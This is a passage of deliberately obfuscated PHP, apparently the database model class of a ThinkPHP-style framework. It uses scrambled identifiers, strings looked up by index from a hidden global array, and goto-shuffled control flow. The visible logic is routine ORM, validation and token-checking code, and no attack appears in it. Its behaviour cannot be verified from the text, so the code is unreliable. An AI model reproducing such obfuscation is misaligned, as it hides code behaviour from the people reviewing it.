strpos($f¡¾ëª¡¢, $FŞŒ±ÒâÅó[287]) || !1 !== strpos($f¡¾ëª¡¢, $FŞŒ±ÒâÅó[288])) { $cõŒšï ìã[$e ¹”Ù˜”õ] = floatval($cõŒšï ìã[$e ¹”Ù˜”õ]); } elseif (!1 !== strpos($f¡¾ëª¡¢, $FŞŒ±ÒâÅó[289])) { $cõŒšï ìã[$e ¹”Ù˜”õ] = (bool) $cõŒšï ìã[$e ¹”Ù˜”õ]; } } } public function find($dìâšŠ¾‚õ = array()) { goto CÃ†…Ş´Ô­; aİŸ…œ„·: $dìâšŠ¾‚õ = $this->_parseOptions(); $c‹’Òö²¶½ = $this->db->select($dìâšŠ¾‚õ); if (!1 === $c‹’Òö²¶½) { return !1; } goto cÁ—ñ¤Óç; CÃ†…Ş´Ô­: $BğÑÚ‘¯ƒ =& $_SERVER[Ôğ—¤Šµˆ˜ñ£]; if (is_numeric($dìâšŠ¾‚õ) || is_string($dìâšŠ¾‚õ)) { $E×ÓµŠ¦Üó[$this->getPk()] = intval($dìâšŠ¾‚õ); $this->options[$BğÑÚ‘¯ƒ[273]] = $E×ÓµŠ¦Üó; } $this->options[$BğÑÚ‘¯ƒ[290]] = 1; goto aİŸ…œ„·; E¡ˆ™Âßò: if (!empty($this->options[$BğÑÚ‘¯ƒ[291]])) { return $this->returnResult($this->data, $this->options[$BğÑÚ‘¯ƒ[291]]); } return $this->data; goto Aô‘„Ã÷ÓŞ; cÁ—ñ¤Óç: if (empty($c‹’Òö²¶½)) { return null; } $this->data = $c‹’Òö²¶½[0]; $this->_afterFind($this->data, $dìâšŠ¾‚õ); goto E¡ˆ™Âßò; Aô‘„Ã÷ÓŞ: } protected function _afterFind(&$bê•ÓŒóğ, $b¥ËÓŞÜé‹) { } protected function returnResult($d„ßŞÛ«“¾, $eƒøÛÔ½Î = '') { $aÃ¿‹¯ËÜù =& $_SERVER[Ôğ—¤Šµˆ˜ñ£]; if ($eƒøÛÔ½Î) { if (is_callable($eƒøÛÔ½Î)) { return call_user_func($eƒøÛÔ½Î, $d„ßŞÛ«“¾); } switch (strtolower($eƒøÛÔ½Î)) { case $aÃ¿‹¯ËÜù[292]: return json_encode($d„ßŞÛ«“¾); case $aÃ¿‹¯ËÜù[293]: return xml_encode($d„ßŞÛ«“¾); } } return $d„ßŞÛ«“¾; } public function parseFieldsMap($aÃµºä†‰Û, $A¬éƒ§×š = 1) { if (!empty($this->_map)) { foreach ($this->_map as $EİàÄ­Æµ¶ => $eØìàÃôˆ“) { if ($A¬éƒ§×š == 1) { if (isset($aÃµºä†‰Û[$eØìàÃôˆ“])) { $aÃµºä†‰Û[$EİàÄ­Æµ¶] = $aÃµºä†‰Û[$eØìàÃôˆ“]; unset($aÃµºä†‰Û[$eØìàÃôˆ“]); } } else { if (isset($aÃµºä†‰Û[$EİàÄ­Æµ¶])) { $aÃµºä†‰Û[$eØìàÃôˆ“] = $aÃµºä†‰Û[$EİàÄ­Æµ¶]; unset($aÃµºä†‰Û[$EİàÄ­Æµ¶]); } } } } return $aÃµºä†‰Û; } public function setField($Fß¡îÓŒŸ, $e‰ªŒóß½Ø = '') { if (is_array($Fß¡îÓŒŸ)) { $D›Àç¡‘Ù÷ = $Fß¡îÓŒŸ; } else { $D›Àç¡‘Ù÷[$Fß¡îÓŒŸ] = $e‰ªŒóß½Ø; } return $this->save($D›Àç¡‘Ù÷); } public function setAdd($bã—¸£Æœ, $Cí´ƒŞç = 1) { $aİŠ©¡ßŠè =& $_SERVER[Ôğ—¤Šµˆ˜ñ£]; $f¹ÍÉÒ±‚å = $bã—¸£Æœ . $aİŠ©¡ßŠè[294] . $Cí´ƒŞç; if ($Cí´ƒŞç < 0) { $f¹ÍÉÒ±‚å = $bã—¸£Æœ . $Cí´ƒŞç; } return $this->setField($bã—¸£Æœ, array($aİŠ©¡ßŠè[295], $f¹ÍÉÒ±‚å)); } public function getField($d¤ØšÈÂø, $a·‡”Ùë£ = null) { $a½•‹ğç‰À =& $_SERVER[Ôğ—¤Šµˆ˜ñ£]; $AßÀß¹ƒä[$a½•‹ğç‰À[271]] = $d¤ØšÈÂø; $AßÀß¹ƒä = $this->_parseOptions($AßÀß¹ƒä); $d¤ØšÈÂø = trim($d¤ØšÈÂø); if (strpos($d¤ØšÈÂø, $a½•‹ğç‰À[47])) { if (!isset($AßÀß¹ƒä[$a½•‹ğç‰À[290]])) { $AßÀß¹ƒä[$a½•‹ğç‰À[290]] = is_numeric($a·‡”Ùë£) ? $a·‡”Ùë£ : $a½•‹ğç‰À[33]; } $FİáºÔ‰µ§ = $this->db->select($AßÀß¹ƒä); if (!empty($FİáºÔ‰µ§)) { goto FÀã…ô«Ë­; DË¬é´†¡ñ: foreach ($FİáºÔ‰µ§ as $c•ª‡Æ÷“) { $Eç×Êåå = $c•ª‡Æ÷“[$D‡½ï„ÈøÌ]; if (2 == $e…ƒğÉ®à£) { $féîÁ¤àÔ[$Eç×Êåå] = $c•ª‡Æ÷“[$BÛàÈÈâŠá]; } else { $féîÁ¤àÔ[$Eç×Êåå] = is_string($a·‡”Ùë£) ? implode($a·‡”Ùë£, $c•ª‡Æ÷“) : $c•ª‡Æ÷“; } } return $féîÁ¤àÔ; goto câ‡‡Õ—†š; FÀã…ô«Ë­: $E »¯í­†á = explode($a½•‹ğç‰À[47], $d¤ØšÈÂø); $d¤ØšÈÂø = array_keys($FİáºÔ‰µ§[0]); $D‡½ï„ÈøÌ = array_shift($d¤ØšÈÂø); goto c‹Óãá¤‘™; c‹Óãá¤‘™: $BÛàÈÈâŠá = array_shift($d¤ØšÈÂø); $féîÁ¤àÔ = array(); $e…ƒğÉ®à£ = count($E »¯í­†á); goto DË¬é´†¡ñ; câ‡‡Õ—†š: } } else { if (!0 !== $a·‡”Ùë£) { $AßÀß¹ƒä[$a½•‹ğç‰À[290]] = is_numeric($a·‡”Ùë£) ? $a·‡”Ùë£ : 1; } if ($a·‡”Ùë£ === $a½•‹ğç‰À[253]) { unset($AßÀß¹ƒä[$a½•‹ğç‰À[290]]); } $c•ª‡Æ÷“ = $this->db->select($AßÀß¹ƒä); if (!empty($c•ª‡Æ÷“)) { if ($a·‡”Ùë£ === $a½•‹ğç‰À[253]) { return reset($c•ª‡Æ÷“[0]); } if (!0 !== $a·‡”Ùë£ && 1 == $AßÀß¹ƒä[$a½•‹ğç‰À[290]]) { return reset($c•ª‡Æ÷“[0]); } foreach ($c•ª‡Æ÷“ as $E©‘ùàÜë») { $cš»¬óê«¡[] = $E©‘ùàÜë»[$d¤ØšÈÂø]; } return $cš»¬óê«¡; } } return null; } public function create($e˜ï±¿öÎÏ = '', $FÓå²–¼ = '') { goto fÈèé¯”À; FÎ‰–“ÄÔ‰: if ($this->autoCheckFields) { $AÇíéÖ¡ = $this->getDbFields(); foreach ($e˜ï±¿öÎÏ as $e°Ğ¶ Úé => $eğÙà‰µë˜) { if (!in_array($e°Ğ¶ Úé, $AÇíéÖ¡)) { unset($e˜ï±¿öÎÏ[$e°Ğ¶ Úé]); } elseif (MAGIC_QUOTES_GPC && is_string($eğÙà‰µë˜)) { $e˜ï±¿öÎÏ[$e°Ğ¶ Úé] = stripslashes($eğÙà‰µë˜); } } } $this->autoOperation($e˜ï±¿öÎÏ, $FÓå²–¼); $this->data = $e˜ï±¿öÎÏ; goto E†Üª¼Ê®; a¿—¸×: $e˜ï±¿öÎÏ = $this->parseFieldsMap($e˜ï±¿öÎÏ, 0); $FÓå²–¼ = $FÓå²–¼ ? $FÓå²–¼ : (!empty($e˜ï±¿öÎÏ[$this->getPk()]) ? THINK_MODEL_UPDATE : THINK_MODEL_INSERT); if (isset($this->options[$aÆçÔ«ğÜ[271]])) { $AÇíéÖ¡ = $this->options[$aÆçÔ«ğÜ[271]]; unset($this->options[$aÆçÔ«ğÜ[271]]); } elseif ($FÓå²–¼ == THINK_MODEL_INSERT && isset($this->insertFields)) { $AÇíéÖ¡ = $this->insertFields; } elseif ($FÓå²–¼ == THINK_MODEL_UPDATE && isset($this->updateFields)) { $AÇíéÖ¡ = $this->updateFields; } goto Eà™“«ªËè; Eà™“«ªËè: if (isset($AÇíéÖ¡)) { if (is_string($AÇíéÖ¡)) { $AÇíéÖ¡ = explode($aÆçÔ«ğÜ[47], $AÇíéÖ¡); } if (think_config($aÆçÔ«ğÜ[296])) { $AÇíéÖ¡[] = think_config($aÆçÔ«ğÜ[297]); } foreach ($e˜ï±¿öÎÏ as $e°Ğ¶ Úé => $eğÙà‰µë˜) { if (!in_array($e°Ğ¶ Úé, $AÇíéÖ¡)) { unset($e˜ï±¿öÎÏ[$e°Ğ¶ Úé]); } } } if (!$this->autoValidation($e˜ï±¿öÎÏ, $FÓå²–¼)) { return !1; } if (!$this->autoCheckToken($e˜ï±¿öÎÏ)) { $this->error = think_lang($aÆçÔ«ğÜ[298]); return !1; } goto FÎ‰–“ÄÔ‰; E†Üª¼Ê®: return $e˜ï±¿öÎÏ; goto CáÈ¥›Œ¸; fÈèé¯”À: $aÆçÔ«ğÜ =& $_SERVER[Ôğ—¤Šµˆ˜ñ£]; if (empty($e˜ï±¿öÎÏ)) { $e˜ï±¿öÎÏ = $_POST; } elseif (is_object($e˜ï±¿öÎÏ)) { $e˜ï±¿öÎÏ = get_object_vars($e˜ï±¿öÎÏ); } if (empty($e˜ï±¿öÎÏ) || !is_array($e˜ï±¿öÎÏ)) { $this->error = think_lang($aÆçÔ«ğÜ[269]); return !1; } goto a¿—¸×; CáÈ¥›Œ¸: } public function autoCheckToken($BÖ»Òòªœ) { $få¶Ÿùà˜ =& $_SERVER[Ôğ—¤Šµˆ˜ñ£]; if (isset($this->options[$få¶Ÿùà˜[299]]) && !$this->options[$få¶Ÿùà˜[299]]) { return !0; } if (think_config($få¶Ÿùà˜[296])) { $AËêÊÎæÎ™ = think_config($få¶Ÿùà˜[297]); if (!isset($BÖ»Òòªœ[$AËêÊÎæÎ™]) || Session::get($AËêÊÎæÎ™)) { return !1; } list($cî¹›ôö—, $Aêçè‡Šæ) = explode($få¶Ÿùà˜[71], $BÖ»Òòªœ[$AËêÊÎæÎ™]); if ($Aêçè‡Šæ && Session::get($AËêÊÎæÎ™ . $få¶Ÿùà˜[95] . $cî¹›ôö—) === $Aêçè‡Šæ) { Session::remove($AËêÊÎæÎ™ . $få¶Ÿùà˜[95] . $cî¹›ôö—); return !0; } if (think_config($få¶Ÿùà˜[300])) { Session::remove($AËêÊÎæÎ™ . $få¶Ÿùà˜[95] . $cî¹›ôö—); } return !1; } return !0; } public function regex($cùİØƒ¯, $c²ìë®„ó) { $e‰ÖÒ¬‚» =& $_SERVER[Ôğ—¤Šµˆ˜ñ£]; $dº‚ÅãŞâ± = array($e‰ÖÒ¬‚»[301] => $e‰ÖÒ¬‚»[302], $e‰ÖÒ¬‚»[303] => $e‰ÖÒ¬‚»[304], $e‰ÖÒ¬‚»[305] => $e‰ÖÒ¬‚»[306], $e‰ÖÒ¬‚»[307] => $e‰ÖÒ¬‚»[308], $e‰ÖÒ¬‚»[309] => $e‰ÖÒ¬‚»[310], $e‰ÖÒ¬‚»[311] => $e‰ÖÒ¬‚»[312], $e‰ÖÒ¬‚»[313] => $e‰ÖÒ¬‚»[314], $e‰ÖÒ¬‚»[288] => $e‰ÖÒ¬‚»[315], $e‰ÖÒ¬‚»[316] => $e‰ÖÒ¬‚»[317]); if (isset($dº‚ÅãŞâ±[strtolower($c²ìë®„ó)])) { $c²ìë®„ó = $dº‚ÅãŞâ±[strtolower($c²ìë®„ó)]; } return preg_match($c²ìë®„ó, $cùİØƒ¯) === 1; } private function autoOperation(&$dÒÎÉùó‡˜, $b×ãÓ‹“®) { $AŸ²¹‹è‘ =& $_SERVER[Ôğ—¤Šµˆ˜ñ£]; if (!empty($this->options[$AŸ²¹‹è‘[318]])) { $bÍæ·‚¾¡¦ = $this->options[$AŸ²¹‹è‘[318]]; unset($this->options[$AŸ²¹‹è‘[318]]); } elseif (!empty($this->_auto)) { $bÍæ·‚¾¡¦ = $this->_auto; } if (isset($bÍæ·‚¾¡¦)) { foreach ($bÍæ·‚¾¡¦ as $AÆ—ÛÕáÏ) { if (empty($AÆ—ÛÕáÏ[2])) { $AÆ—ÛÕáÏ[2] = THINK_MODEL_INSERT; } if ($b×ãÓ‹“® == $AÆ—ÛÕáÏ[2] || $AÆ—ÛÕáÏ[2] == THINK_MODEL_BOTH) { switch (trim($AÆ—ÛÕáÏ[3])) { case $AŸ²¹‹è‘[319]: case $AŸ²¹‹è‘[320]: $EŒ¨Ì“Ê‹Ñ = isset($AÆ—ÛÕáÏ[4]) ? (array) $AÆ—ÛÕáÏ[4] : array(); if (isset($dÒÎÉùó‡˜[$AÆ—ÛÕáÏ[0]])) { array_unshift($EŒ¨Ì“Ê‹Ñ, $dÒÎÉùó‡˜[$AÆ—ÛÕáÏ[0]]); } if ($AŸ²¹‹è‘[319] == $AÆ—ÛÕáÏ[3]) { $dÒÎÉùó‡˜[$AÆ—ÛÕáÏ[0]] = call_user_func_array($AÆ—ÛÕáÏ[1], $EŒ¨Ì“Ê‹Ñ); } else { $dÒÎÉùó‡˜[$AÆ—ÛÕáÏ[0]] = call_user_func_array(array(&$this, $AÆ—ÛÕáÏ[1]), $EŒ¨Ì“Ê‹Ñ); } break; case $AŸ²¹‹è‘[271]: $dÒÎÉùó‡˜[$AÆ—ÛÕáÏ[0]] = $dÒÎÉùó‡˜[$AÆ—ÛÕáÏ[1]]; break; case $AŸ²¹‹è‘[321]: if ($AŸ²¹‹è‘[33] === $dÒÎÉùó‡˜[$AÆ—ÛÕáÏ[0]]) { unset($dÒÎÉùó‡˜[$AÆ—ÛÕáÏ[0]]); } break; case $AŸ²¹‹è‘[322]: default: $dÒÎÉùó‡˜[$AÆ—ÛÕáÏ[0]] = $AÆ—ÛÕáÏ[1]; } if (!1 === $dÒÎÉùó‡˜[$AÆ—ÛÕáÏ[0]]) { unset($dÒÎÉùó‡˜[$AÆ—ÛÕáÏ[0]]); } } } } return $dÒÎÉùó‡˜; } protected function autoValidation($A©®Ë¬¸ÌÎ, $Eğğ„ˆ¾…) { $c‡ôíùĞœ¤ =& $_SERVER[Ôğ—¤Šµˆ˜ñ£]; if (!empty($this->options[$c‡ôíùĞœ¤[323]])) { $Aí¦š»²‹• = $this->options[$c‡ôíùĞœ¤[323]]; unset($this->options[$c‡ôíùĞœ¤[323]]); } elseif (!empty($this->_validate)) { $Aí¦š»²‹• = $this->_validate; } if (isset($Aí¦š»²‹•)) { if ($this->patchValidate) { $this->error = array(); } foreach ($Aí¦š»²‹• as $e«ê¢ë¾¨ï => $e„Ô“‚…“¥) { if (empty($e„Ô“‚…“¥[5]) || $e„Ô“‚…“¥[5] == THINK_MODEL_BOTH || $e„Ô“‚…“¥[5] == $Eğğ„ˆ¾…) { if (0 == strpos($e„Ô“‚…“¥[2], $c‡ôíùĞœ¤[324]) && strpos($e„Ô“‚…“¥[2], $c‡ôíùĞœ¤[325])) { $e„Ô“‚…“¥[2] = think_lang(substr($e„Ô“‚…“¥[2], 2, -1)); } $e„Ô“‚…“¥[3] = isset($e„Ô“‚…“¥[3]) ? $e„Ô“‚…“¥[3] : THINK_EXISTS_VALIDATE; $e„Ô“‚…“¥[4] = isset($e„Ô“‚…“¥[4]) ? $e„Ô“‚…“¥[4] : $c‡ôíùĞœ¤[326]; switch ($e„Ô“‚…“¥[3]) { case THINK_MUST_VALIDATE: if (!1 === $this->_validationField($A©®Ë¬¸ÌÎ, $e„Ô“‚…“¥)) { return !1; } break; case THINK_VALUE_VALIDATE: if ($c‡ôíùĞœ¤[33] != trim($A©®Ë¬¸ÌÎ[$e„Ô“‚…“¥[0]])) { if (!1 === $this->_validationField($A©®Ë¬¸ÌÎ, $e„Ô“‚…“¥)) { return !1; } } break; default: if (isset($A©®Ë¬¸ÌÎ[$e„Ô“‚…“¥[0]])) { if (!1 === $this->_validationField($A©®Ë¬¸ÌÎ, $e„Ô“‚…“¥)) { return !1; } } } } } if (!empty($this->error)) { return !1; } } return !0; } protected function _validationField($b£‡Ÿ±ª·, $e¼ßĞµŞ) { if (!1 === $this->_validationFieldItem($b£‡Ÿ±ª·, $e¼ßĞµŞ)) { if ($this->patchValidate) { $this->error[$e¼ßĞµŞ[0]] = $e¼ßĞµŞ[2]; } else { $this->error = $e¼ßĞµŞ[2]; return !1; } } return; } protected function _validationFieldItem($cÓçöôÛÉç, $E¯¨Ñ…Ú¨) { $A£å‰÷ùº‘ =& $_SERVER[Ôğ—¤Šµˆ˜ñ£]; switch (strtolower(trim($E¯¨Ñ…Ú¨[4]))) { case $A£å‰÷ùº‘[319]: case $A£å‰÷ùº‘[320]: $B˜‚Û¼¯Ó¨ = isset($E¯¨Ñ…Ú¨[6]) ? (array) $E¯¨Ñ…Ú¨[6] : array(); if (is_string($E¯¨Ñ…Ú¨[0]) && strpos($E¯¨Ñ…Ú¨[0], $A£å‰÷ùº‘[47])) { $E¯¨Ñ…Ú¨[0] = explode($A£å‰÷ùº‘[47], $E¯¨Ñ…Ú¨[0]); } if (is_array($E¯¨Ñ…Ú¨[0])) { foreach ($E¯¨Ñ…Ú¨[0] as $eá“É“£Œƒ) { $F˜ºŠÀŒ‰[$eá“É“£Œƒ] = $cÓçöôÛÉç[$eá“É“£Œƒ]; } array_unshift($B˜‚Û¼¯Ó¨, $F˜ºŠÀŒ‰); } else { array_unshift($B˜‚Û¼¯Ó¨, $cÓçöôÛÉç[$E¯¨Ñ…Ú¨[0]]); } if ($A£å‰÷ùº‘[319] == $E¯¨Ñ…Ú¨[4]) { return call_user_func_array($E¯¨Ñ…Ú¨[1], $B˜‚Û¼¯Ó¨); } else { return call_user_func_array(array(&$this, $E¯¨Ñ…Ú¨[1]), $B˜‚Û¼¯Ó¨); } case $A£å‰÷ùº‘[327]: return $cÓçöôÛÉç[$E¯¨Ñ…Ú¨[0]] == $cÓçöôÛÉç[$E¯¨Ñ…Ú¨[1]]; case $A£å‰÷ùº‘[328]: if (is_string($E¯¨Ñ…Ú¨[0]) && strpos($E¯¨Ñ…Ú¨[0], $A£å‰÷ùº‘[47])) { $E¯¨Ñ…Ú¨[0] = explode($A£å‰÷ùº‘[47], $E¯¨Ñ…Ú¨[0]); } $F§®¥®‹—¡ = array(); if (is_array($E¯¨Ñ…Ú¨[0])) { foreach ($E¯¨Ñ…Ú¨[0] as $eá“É“£Œƒ) { $F§®¥®‹—¡[$eá“É“£Œƒ] = $cÓçöôÛÉç[$eá“É“£Œƒ]; } } else { $F§®¥®‹—¡[$E¯¨Ñ…Ú¨[0]] = $cÓçöôÛÉç[$E¯¨Ñ…Ú¨[0]]; } if (!empty($cÓçöôÛÉç[$this->getPk()])) { $F§®¥®‹—¡[$this->getPk()] = array($A£å‰÷ùº‘[329], $cÓçöôÛÉç[$this->getPk()]); } if ($this->where($F§®¥®‹—¡)->find()) { return !1; } return !0; default: return $this->check($cÓçöôÛÉç[$E¯¨Ñ…Ú¨[0]], $E¯¨Ñ…Ú¨[1], $E¯¨Ñ…Ú¨[4]); } } public function check($BËØÌÁ‰‰, $f†­‡¨Úò, $dÉ½÷Ì›„ = "\x72\x65\147\x65\x78") { $CŸ‡ƒ‚’¯£ =& $_SERVER[Ôğ—¤Šµˆ˜ñ£]; $dÉ½÷Ì›„ = strtolower(trim($dÉ½÷Ì›„)); switch ($dÉ½÷Ì›„) { case $CŸ‡ƒ‚’¯£[7]: case $CŸ‡ƒ‚’¯£[330]: $d“÷Íƒ„Æ‘ = is_array($f†­‡¨Úò) ? $f†­‡¨Úò : explode($CŸ‡ƒ‚’¯£[47], $f†­‡¨Úò); return $dÉ½÷Ì›„ == $CŸ‡ƒ‚’¯£[7] ? in_array($BËØÌÁ‰‰, $d“÷Íƒ„Æ‘) : !in_array($BËØÌÁ‰‰, $d“÷Íƒ„Æ‘); case $CŸ‡ƒ‚’¯£[331]: case $CŸ‡ƒ‚’¯£[332]: if (is_array($f†­‡¨Úò)) { $C·Ò­Ä± = $f†­‡¨Úò[0]; $bÄ¾¬§ÅÌÚ = $f†­‡¨Úò[1]; } else { list($C·Ò­Ä±, $bÄ¾¬§ÅÌÚ) = explode($CŸ‡ƒ‚’¯£[47], $f†­‡¨Úò); } return $dÉ½÷Ì›„ == $CŸ‡ƒ‚’¯£[331] ? $BËØÌÁ‰‰ >= $C·Ò­Ä± && $BËØÌÁ‰‰ <= $bÄ¾¬§ÅÌÚ : $BËØÌÁ‰‰ < $C·Ò­Ä± || $BËØÌÁ‰‰ > $bÄ¾¬§ÅÌÚ; case $CŸ‡ƒ‚’¯£[333]: case $CŸ‡ƒ‚’¯£[334]: return $dÉ½÷Ì›„ == $CŸ‡ƒ‚’¯£[333] ? $BËØÌÁ‰‰ == $f†­‡¨Úò : $BËØÌÁ‰‰ != $f†­‡¨Úò; case $CŸ‡ƒ‚’¯£[335]: $CËõ®æ×Ææ = mb_strlen($BËØÌÁ‰‰, $CŸ‡ƒ‚’¯£[336]); if (strpos($f†­‡¨Úò, $CŸ‡ƒ‚’¯£[47])) { list($C·Ò­Ä±, $bÄ¾¬§ÅÌÚ) = explode($CŸ‡ƒ‚’¯£[47], $f†­‡¨Úò); return $CËõ®æ×Ææ >= $C·Ò­Ä± && $CËõ®æ×Ææ <= $bÄ¾¬§ÅÌÚ; } else { return $CËõ®æ×Ææ == $f†­‡¨Úò; } case $CŸ‡ƒ‚’¯£[337]: list($cˆÖ¼­ó‘, $Cİâ–”‘…±) = explode($CŸ‡ƒ‚’¯£[47], $f†­‡¨Úò); if (!is_numeric($cˆÖ¼­ó‘)) { $cˆÖ¼­ó‘ = strtotime($cˆÖ¼­ó‘); } if (!is_numeric($Cİâ–”‘…±)) { $Cİâ–”‘…± = strtotime($Cİâ–”‘…±); } return NOW_TIME >= $cˆÖ¼­ó‘ && NOW_TIME <= $Cİâ–”‘…±; case $CŸ‡ƒ‚’¯£[338]: return in_array(get_client_ip(), explode($CŸ‡ƒ‚’¯£[47], $f†­‡¨Úò)); case $CŸ‡ƒ‚’¯£[339]: return !in_array(get_client_ip(), explode($CŸ‡ƒ‚’¯£[47], $f†­‡¨Úò)); case $CŸ‡ƒ‚’¯£[326]: default: return $this->regex($BËØÌÁ‰‰, $f†­‡¨Úò); } } public function query($cƒ™ŸÅ‰ , $b¨Ä‘Âò×Î = false) { $d«É÷¶ËË =& $_SERVER[Ôğ—¤Šµˆ˜ñ£]; if (!is_bool($b¨Ä‘Âò×Î) && !is_array($b¨Ä‘Âò×Î)) { $b¨Ä‘Âò×Î = func_get_args(); array_shift($b¨Ä‘Âò×Î); } $cƒ™ŸÅ‰  = str_replace(array($d«É÷¶ËË[229], $d«É÷¶ËË[340]), $d«É÷¶ËË[50], $cƒ™ŸÅ‰ ); $cƒ™ŸÅ‰  = $this->parseSql($cƒ™ŸÅ‰ , $b¨Ä‘Âò×Î); return $this->db->query($cƒ™ŸÅ‰ ); } public function execute($c¬ÁÎŸ®ïê, $AÀÂ³äµİã = false) { if (!is_bool($AÀÂ³äµİã) && !is_array($AÀÂ³äµİã)) { $AÀÂ³äµİã = func_get_args(); array_shift($AÀÂ³äµİã); } $c¬ÁÎŸ®ïê = $this->parseSql($c¬ÁÎŸ®ïê, $AÀÂ³äµİã); return $this->db->execute($c¬ÁÎŸ®ïê); } protected function parseSql($b¤¿ïÛ¹´Ï, $D´‡Ì»ãó½) { $f¢ç…ìØ‰é =& $_SERVER[Ôğ—¤Šµˆ˜ñ£]; if (!0 === $D´‡Ì»ãó½) { $b¶£²ìöÑó = $this->_parseOptions(); $b¤¿ïÛ¹´Ï = $this->db->parseSql($b¤¿ïÛ¹´Ï, $b¶£²ìöÑó); } elseif (is_array($D´‡Ì»ãó½)) { $D´‡Ì»ãó½ = array_map(array($this->db, $f¢ç…ìØ‰é[341]), $D´‡Ì»ãó½); $b¤¿ïÛ¹´Ï = vsprintf($b¤¿ïÛ¹´Ï, $D´‡Ì»ãó½); } else { $b¤¿ïÛ¹´Ï = strtr($b¤¿ïÛ¹´Ï, array($f¢ç…ìØ‰é[342] => $this->getTableName(), $f¢ç…ìØ‰é[343] => think_config($f¢ç…ìØ‰é[242]))); } $this->db->setModel($this->name); return $b¤¿ïÛ¹´Ï; } public function db($dÖ¡³ƒâã = '', $eèí°×¥¬¬ = '', $a­¾çÍŒÚ“ = array()) { goto aßšóä¯½â; CÖêêÆà—Õ: if (!empty($this->name) && $this->autoCheckFields) { $this->_checkTableInfo(); } return $this; goto d›ºëÛ–áÏ; fÈÜ†²Šñ³: $eçì„„ƒ°…[$dÖ¡³ƒâã] = $eèí°×¥¬¬; $this->db = $D­Ü¦‡¡°²[$dÖ¡³ƒâã]; $this->_after_db(); goto CÖêêÆà—Õ; a­Ü×Ã®¢ô: static $D­Ü¦‡¡°² = array(); if (!isset($D­Ü¦‡¡°²[$dÖ¡³ƒâã]) || isset($D­Ü¦‡¡°²[$dÖ¡³ƒâã]) && $eèí°×¥¬¬ && $eçì„„ƒ°…[$dÖ¡³ƒâã] != $eèí°×¥¬¬) { if (!empty($eèí°×¥¬¬) && is_string($eèí°×¥¬¬) && !1 === strpos($eèí°×¥¬¬, $d±æºš®¹[8])) { $eèí°×¥¬¬ = think_config($eèí°×¥¬¬); } $D­Ü¦‡¡°²[$dÖ¡³ƒâã] = Db::getInstance($eèí°×¥¬¬); } elseif (NULL === $eèí°×¥¬¬) { $D­Ü¦‡¡°²[$dÖ¡³ƒâã]->close(); unset($D­Ü¦‡¡°²[$dÖ¡³ƒâã]); return; } if (!empty($a­¾çÍŒÚ“)) { if (is_string($a­¾çÍŒÚ“)) { parse_str($a­¾çÍŒÚ“, $a­¾çÍŒÚ“); } foreach ($a­¾çÍŒÚ“ as $Eå˜éöÖÒŒ => $CÊÇ©‡•Ñ‡) { $this->setProperty($Eå˜éöÖÒŒ, $CÊÇ©‡•Ñ‡); } } goto fÈÜ†²Šñ³; aßšóä¯½â: $d±æºš®¹ =& $_SERVER[Ôğ—¤Šµˆ˜ñ£]; if ($d±æºš®¹[33] === $dÖ¡³ƒâã && $this->db) { return $this->db; } static $eçì„„ƒ°… = array(); goto a­Ü×Ã®¢ô; d›ºëÛ–áÏ: } protected function _after_db() { } public function getModelName() { if (empty($this->name)) { $D·ô‡ğ˜ÛÓ = get_class($this); if ($D·ô‡ğ˜ÛÓ == $_SERVER[Ôğ—¤Šµˆ˜ñ£][344]) { return $this->name; } $this->name = substr($D·ô‡ğ˜ÛÓ, 0, -5); } return $this->name; } public function getTableName() { $C±ÇğÛÖˆ =& $_SERVER[Ôğ—¤Šµˆ˜ñ£]; if (empty($this->trueTableName)) { $BÊ³´¤øàŒ = !empty($this->tablePrefix) ? $this->tablePrefix : $C±ÇğÛÖˆ[33]; if (!empty($this->tableName)) { $BÊ³´¤øàŒ .= $this->tableName; } else { $BÊ³´¤øàŒ .= think_parse_name($this->name); } $this->trueTableName = strtolower($BÊ³´¤øàŒ); } return (!empty($this->dbName) ? $this->dbName . $C±ÇğÛÖˆ[95] : $C±ÇğÛÖˆ[33]) . $this->trueTableName; } public function startTrans() { $this->commit(); $this->db->startTrans(); return; } public function commit() { return $this->db->commit(); } public function rollback() { return $this->db->rollback(); } public function getError() { return $this->error; } public function getDbError() { return $this->db->getError(); } public function getLastInsID() { return $this->db->getLastInsID(); } public function getLastSql() { return $this->db->getLastSql($this->name); } public function _sql() { return $this->getLastSql(); } public function getPk() { $eË“ÏƒåŸÔ =& $_SERVER[Ôğ—¤Šµˆ˜ñ£]; return isset($this->fields[$eË“ÏƒåŸÔ[249]]) ? $this->fields[$eË“ÏƒåŸÔ[249]] : $this->pk; } public function getDbFields() { $Eìˆ—¾¦­ =& $_SERVER[Ôğ—¤Šµˆ˜ñ£]; if (isset($this->options[$Eìˆ—¾¦­[277]])) { $D‹›¨Î…Íµ = $this->db->getFields($this->options[$Eìˆ—¾¦­[277]]); return $D‹›¨Î…Íµ ? array_keys($D‹›¨Î…Íµ) : !1; } if ($this->fields) { $D‹›¨Î…Íµ = $this->fields; unset($D‹›¨Î…Íµ[$Eìˆ—¾¦­[248]], $D‹›¨Î…Íµ[$Eìˆ—¾¦­[249]], $D‹›¨Î…Íµ[$Eìˆ—¾¦­[250]], $D‹›¨Î…Íµ[$Eìˆ—¾¦­[247]]); return $D‹›¨Î…Íµ; } return !1; } public function data($D¡¤ñ¼Û„³ = '') { $b·ÏÉíŒ¼ =& $_SERVER[Ôğ—¤Šµˆ˜ñ£]; if ($b·ÏÉíŒ¼[33] === $D¡¤ñ¼Û„³ && !empty($this->data)) { return $this->data; } if (is_object($D¡¤ñ¼Û„³)) { $D¡¤ñ¼Û„³ = get_object_vars($D¡¤ñ¼Û„³); } elseif (is_string($D¡¤ñ¼Û„³)) { parse_str($D¡¤ñ¼Û„³, $D¡¤ñ¼Û„³); } elseif (!is_array($D¡¤ñ¼Û„³)) { think_exception(think_lang($b·ÏÉíŒ¼[269])); } $this->data = $D¡¤ñ¼Û„³; return $this; } public function join($EÊËË±‹«ê) { $fŸ…»µÑÆ‹ =& $_SERVER[Ôğ—¤Šµˆ˜ñ£]; if (is_array($EÊËË±‹«ê)) { $this->options[$fŸ…»µÑÆ‹[280]] = $EÊËË±‹«ê; } elseif (!empty($EÊËË±‹«ê)) { $this->options[$fŸ…»µÑÆ‹[280]][] = $EÊËË±‹«ê; } return $this; } public function union($a‘ˆ³äªÓ, $fñ”îéÊ¼× = false) { goto cñ×µ´Úäï; a¿òµ‚æÇÄ: if (is_object($a‘ˆ³äªÓ)) { $a‘ˆ³äªÓ = get_object_vars($a‘ˆ³äªÓ); } if (is_string($a‘ˆ³äªÓ)) { $A¥£² Áº = $a‘ˆ³äªÓ; } elseif 